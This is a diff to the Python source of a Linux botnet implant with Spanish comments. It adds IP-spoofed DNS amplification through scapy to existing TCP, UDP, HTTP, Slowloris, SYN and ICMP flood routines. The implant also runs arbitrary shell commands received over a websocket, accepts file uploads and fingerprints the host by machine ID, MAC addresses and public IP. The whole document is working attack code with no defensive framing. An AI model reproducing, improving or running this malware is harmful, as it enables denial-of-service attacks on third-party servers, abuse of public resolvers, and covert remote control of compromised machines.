@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import asyncio
 import json
 import subprocess
@@ -11,9 +12,12 @@ import threading
 import time
 import uuid
 import re
+import platform
+import netifaces
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
+from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
 import requests
 
 class LinuxImpl:
@@ -111,13 +115,16 @@ class LinuxImpl:
     
     def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
         """Ejecuta un comando en el shell y retorna stdout, stderr y el directorio actual"""
-        escaped_cmd = command.replace('"', '\"')
-        result = subprocess.run(
-            ['/bin/bash', '-c', f'cd "{self.current_dir}" && {escaped_cmd}'],
-            capture_output=True, 
-            text=True
-        )
-        return result.stdout, result.stderr, self.current_dir
+        try:
+            result = subprocess.run(
+                ['/bin/bash', '-c', f'cd "{self.current_dir}" && {command}'],
+                capture_output=True, 
+                text=True,
+                timeout=60
+            )
+            return result.stdout, result.stderr, self.current_dir
+        except subprocess.TimeoutExpired:
+            return "", "Comando excedió el tiempo límite de ejecución (60s)", self.current_dir
     
     async def _handle_file_upload(self, ws, data: Dict) -> None:
         """Maneja la subida de archivos por chunks"""
@@ -138,9 +145,6 @@ class LinuxImpl:
                 # Limpieza del buffer
                 self.upload_buffer.clear()
                 self.upload_destination = None
-                
-                # Dar permisos de ejecución si es necesario
-                os.chmod(self.upload_destination, 0o755)
                 
                 await ws.send(json.dumps({
                     "status": "success",
@@ -165,13 +169,22 @@ class LinuxImpl:
         try:
             for name in os.listdir(path):
                 full_path = os.path.join(path, name)
-                item_type = "directory" if os.path.isdir(full_path) else "file"
-                items.append({
-                    "name": name,
-                    "type": item_type,
-                    "size": os.path.getsize(full_path) if item_type == "file" else 0,
-                    "permissions": oct(os.stat(full_path).st_mode)[-3:]
-                })
+                try:
+                    item_type = "directory" if os.path.isdir(full_path) else "file"
+                    size = os.path.getsize(full_path) if item_type == "file" else 0
+                    items.append({
+                        "name": name,
+                        "type": item_type,
+                        "size": size,
+                        "permissions": oct(os.stat(full_path).st_mode & 0o777)
+                    })
+                except Exception as e:
+                    items.append({
+                        "name": name,
+                        "type": "unknown",
+                        "size": 0,
+                        "error": str(e)
+                    })
             
             await ws.send(json.dumps({
                 "items": items,
@@ -214,7 +227,7 @@ class LinuxImpl:
         """Maneja los comandos de ataque"""
         attack_type = data['attack']['type']
         target = data['attack']['target']
-        duration = int(data['attack'].get('duration', 60))
+        duration = data['attack'].get('duration', 60)
         
         # Detener cualquier ataque previo
         if self.active_attack:
@@ -224,7 +237,7 @@ class LinuxImpl:
         self.active_attack = True
         self.attack_thread = threading.Thread(
             target=self._execute_attack,
-            args=(attack_type, target, duration, ws),
+            args=(str(attack_type), str(target), int(duration), ws),
             daemon=True
         )
         self.attack_thread.start()
@@ -263,7 +276,7 @@ class LinuxImpl:
             self.active_attack = False
     
     def _tcp_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque de inundación TCP para Linux"""
+        """Ataque de inundación TCP"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
@@ -272,33 +285,35 @@ class LinuxImpl:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1)
                 s.connect((target_ip, target_port))
-                s.send(os.urandom(1024))
+                s.send(random._urandom(1024))
                 s.close()
             except:
                 pass
     
     def _udp_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque de inundación UDP para Linux"""
+        """Ataque de inundación UDP"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
         while time.time() < end_time and self.active_attack:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.sendto(os.urandom(1024), (target_ip, target_port))
+                s.sendto(random._urandom(1024), (target_ip, target_port))
                 s.close()
             except:
                 pass
     
     def _http_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque de inundación HTTP para Linux"""
+        """Ataque de inundación HTTP"""
         import urllib.request
         
         if not target.startswith(('http://', 'https://')):
             target = 'http://' + target
         
+        socket.setdefaulttimeout(5)
+        
         headers = {
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
+            'User-Agent': 'Mozilla/5.0',
             'Accept': '*/*',
             'Connection': 'close'
         }
@@ -313,9 +328,12 @@ class LinuxImpl:
         
         while time.time() < end_time and self.active_attack:
             try:
-                with urllib.request.urlopen(request, timeout=5) as response:
+                with urllib.request.urlopen(request) as response:
                     response.read(64)
                 time.sleep(0.01)
+            except urllib.error.URLError as e:
+                print(f"[!] Error de URL: {e.reason}")
+                break
             except Exception as e:
                 print(f"[!] Error: {str(e)}")
                 time.sleep(1)
@@ -323,7 +341,7 @@ class LinuxImpl:
         print("[*] Ataque HTTP Flood finalizado")
     
     def _slowloris_attack(self, target: str, end_time: float) -> None:
-        """Ataque Slowloris para Linux"""
+        """Ataque Slowloris (mantiene conexiones HTTP abiertas)"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         sockets = []
@@ -341,6 +359,7 @@ class LinuxImpl:
                     self._close_sockets(sockets)
                     sockets = []
                 
+                # Mantener conexiones vivas
                 for s in sockets:
                     try:
                         s.send("X-a: b\r\n".encode())
@@ -352,52 +371,62 @@ class LinuxImpl:
             self._close_sockets(sockets)
     
     def _syn_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque SYN flood para Linux (requiere root)"""
+        """Ataque SYN flood (requiere permisos root)"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
         while time.time() < end_time and self.active_attack:
             try:
-                # En Linux podemos usar el módulo scapy para mejor control
-                from scapy.all import IP, TCP, send
-                packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
-                send(packet, verbose=0)
-            except ImportError:
-                # Fallback básico si scapy no está instalado
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                    s.sendto(b'\x00'*64, (target_ip, target_port))
-                    s.close()
-                except:
-                    pass
+                # Crear socket raw requiere permisos de root
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                
+                # Paquete SYN simplificado
+                packet = b'\x00' * 64  # Placeholder
+                s.sendto(packet, (target_ip, target_port))
+                s.close()
             except:
                 pass
     
     def _icmp_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque ICMP flood (Ping flood) para Linux"""
+        """Ataque ICMP (Ping) flood (requiere permisos root)"""
         while time.time() < end_time and self.active_attack:
             try:
-                os.system(f"ping -c 1 -s 65500 {target} > /dev/null 2>&1")
+                subprocess.run(["ping", "-c", "1", "-s", "65500", target], 
+                              stdout=subprocess.DEVNULL, 
+                              stderr=subprocess.DEVNULL)
             except:
                 pass
     
     def _dns_amplification_attack(self, target: str, end_time: float) -> None:
-        """Ataque de amplificación DNS para Linux"""
-        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
+        """Ataque de amplificación DNS con IP spoofing (requiere permisos root)"""
+        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
         target_ip = target.split(":")[0]
+        
+        large_domains = [
+            "example.com", 
+            "isc.org", 
+            "ripe.net",
+            "google.com",
+            "microsoft.com"
+        ]
         
         while time.time() < end_time and self.active_attack:
             try:
                 for dns_server in dns_servers:
-                    # Consulta DNS tipo ANY para amplificación
-                    query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01'
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.sendto(query, (dns_server, 53))
-                    s.close()
-            except:
+                    domain = random.choice(large_domains)
+                    
+                    dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
+                        rd=1,
+                        qd=DNSQR(qname=domain, qtype="ANY")
+                    )
+                    
+                    send(dns_query, verbose=0)
+                    time.sleep(0.01)
+                    
+            except Exception as e:
                 pass
-    
+
     def _close_sockets(self, sockets: list) -> None:
         """Cierra todos los sockets en la lista"""
         for s in sockets:
@@ -434,60 +463,74 @@ class LinuxImpl:
 
     @property
     def impl_id(self) -> str:
-        """Obtiene un ID único para el implante en Linux"""
+        """Obtiene un ID único para el implante basado en la máquina"""
         try:
-            # Intentar obtener ID único de la máquina
-            with open('/etc/machine-id') as f:
-                return f.read().strip()
+            # Intentar obtener un ID único del sistema
+            with open('/etc/machine-id', 'r') as f:
+                machine_id = f.read().strip()
+                if machine_id:
+                    return machine_id
         except:
-            # Fallback a UUID generado
-            return str(uuid.uuid4())
+            pass
+        
+        try:
+            # Si no hay machine-id, usar el ID de la interfaz de red
+            macs = self._get_macs()
+            if macs and macs[0] != 'undefined':
+                return macs[0].replace(':', '')
+        except:
+            pass
+        
+        # Como último recurso, generar un UUID
+        return str(uuid.uuid4())
     
     def _get_macs(self) -> List[str]:
-        """Obtiene las direcciones MAC de las interfaces de red en Linux"""
+        """Obtiene las direcciones MAC de las interfaces de red"""
         try:
             macs = []
-            for iface in os.listdir('/sys/class/net/'):
-                if iface != 'lo':  # Ignorar loopback
-                    with open(f'/sys/class/net/{iface}/address') as f:
-                        mac = f.read().strip()
-                        if mac:
-                            macs.append(mac)
+            for interface in netifaces.interfaces():
+                addr = netifaces.ifaddresses(interface)
+                if netifaces.AF_LINK in addr:
+                    mac = addr[netifaces.AF_LINK][0].get('addr')
+                    if mac and mac != '00:00:00:00:00:00':
+                        macs.append(mac)
             return macs if macs else ['undefined']
         except:
             return ['undefined']
     
     def _get_local_ips(self) -> List[str]:
-        """Obtiene las direcciones IP locales en Linux"""
+        """Obtiene las direcciones IP locales"""
         try:
-            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
-            ips = result.stdout.strip().split()
+            ips = []
+            for interface in netifaces.interfaces():
+                addr = netifaces.ifaddresses(interface)
+                if netifaces.AF_INET in addr:
+                    ip = addr[netifaces.AF_INET][0].get('addr')
+                    if ip and not ip.startswith('127.'):
+                        ips.append(ip)
             return ips if ips else ['undefined']
         except:
             return ['undefined']
     
     def _get_public_ip(self) -> str:
-        """Obtiene la dirección IP pública en Linux"""
+        """Obtiene la dirección IP pública"""
         try:
-            result = subprocess.run(
-                ['curl', '-s', 'https://api.ipify.org'],
-                capture_output=True,
-                text=True
-            )
-            return result.stdout.strip() if result.stdout.strip() else "undefined"
+            response = requests.get('https://api.ipify.org', timeout=5)
+            return response.text.strip() if response.status_code == 200 else "undefined"
         except:
             return "undefined"
     
     def _get_operating_system(self) -> str:
-        """Obtiene información del sistema operativo en Linux"""
+        """Obtiene información del sistema operativo"""
         try:
-            with open('/etc/os-release') as f:
+            with open('/etc/os-release', 'r') as f:
                 for line in f:
                     if line.startswith('PRETTY_NAME='):
                         return line.split('=')[1].strip().strip('"')
-            return "Linux (Unknown Distro)"
         except:
-            return "Linux"
+            pass
+        
+        return f"{platform.system()} {platform.release()}"
     
     def _def_handler(self, sig, frame) -> None:
         """Manejador de señales para salida limpia"""
